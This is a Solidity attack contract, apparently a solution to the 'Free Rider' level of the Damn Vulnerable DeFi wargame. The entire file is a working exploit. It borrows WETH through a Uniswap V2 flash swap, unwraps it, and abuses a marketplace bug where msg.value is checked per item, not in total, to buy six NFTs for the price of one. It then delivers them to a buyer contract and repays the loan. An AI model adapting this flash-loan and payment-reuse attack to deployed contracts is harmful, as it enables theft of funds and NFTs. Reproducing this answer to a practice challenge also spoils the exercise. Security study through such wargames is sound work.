//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import '../free-rider/FreeRiderNFTMarketplace.sol';
import '../free-rider/FreeRiderBuyer.sol';
import '../DamnValuableNFT.sol';
import '../DamnValuableToken.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';

contract MarketplaceAttack is IUniswapV2Callee, IERC721Receiver {

  using Address for address;

  FreeRiderNFTMarketplace public mkt;
  IUniswapV2Factory public factory;
  FreeRiderBuyer public buyr;
  DamnValuableNFT public nft;
  DamnValuableToken public tkn;
  address payable public weth;


  address payable public hacker;


  constructor (address payable _market, address _factory, address payable _nft, address _dvt, address payable _weth, address payable _buyer,address payable _hacker) {
    mkt = FreeRiderNFTMarketplace(_market);
    factory = IUniswapV2Factory(_factory);
    nft = DamnValuableNFT(_nft);
    tkn = DamnValuableToken(_dvt);
    weth = _weth;
    buyr = FreeRiderBuyer(_buyer);
    hacker = _hacker;
  }
  receive() external payable {}
  function flashSwap(address _tokenBorrowed, uint _amount) external {
    address pair = factory.getPair(_tokenBorrowed, address(tkn));
    require(pair != address(0), "this pair does not exist");

    address token0 = IUniswapV2Pair(pair).token0();
    address token1 = IUniswapV2Pair(pair).token1();
    uint amount0Out = _tokenBorrowed == token0 ? _amount : 0;
    uint amount1Out = _tokenBorrowed == token1 ? _amount : 0;

    bytes memory data = abi.encode(_tokenBorrowed, _amount);
    IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
  }


  function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data) external override{
    

    address token0 = IUniswapV2Pair(msg.sender).token0();
    address token1 = IUniswapV2Pair(msg.sender).token1();
    address pair = factory.getPair(token0, token1);
    require(msg.sender == pair, "must be sent by pair contract");
    require(_sender == address(this), "this contract did not start this flashloan");

    //decode data sent with flashloan
    (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));

    uint UniswapFee = (amount * 3 / 997) + 1;
    uint amountToRepay = amount + UniswapFee;

    //Flash Loan logic
    //Swap all WETH to ETH
    uint256 balanceWeth = IERC20(tokenBorrow).balanceOf(address(this));
    //OpenZeppelin Address function call using a low level call. If target reverts with a revert reason, it is bubbled up by this function (like regular Solidity function calls). 
    tokenBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", balanceWeth));
    // Purchase all NFTs for the price of 1. Because require(msg.value) is only checked in _buyOne
    uint256[] memory tokenIds = new uint256[](6);
    for (uint256 i = 0; i < 6; i++) {
        tokenIds[i] = i;
    } 
    mkt.buyMany{ value: 15 ether}(tokenIds) ;

    for (uint256 i = 0; i < 6; i++) {
      IERC721(address(nft)).safeTransferFrom(address(this), address(buyr), i);
    }
    // swap ETH for WETH
    (bool success,) = weth.call{value: amountToRepay }("");
    require(success, "the weth deposit failed");

    // pay back WETH flashLoan
    IERC20(tokenBorrow).transfer(pair, amountToRepay);
  }
// Interface required to receive NFT as a Smart Contract
  function onERC721Received(
      address operator,
      address from,
      uint256 tokenId,
      bytes calldata data
  ) external override pure returns (bytes4) {
      return IERC721Receiver.onERC721Received.selector;
  }
}
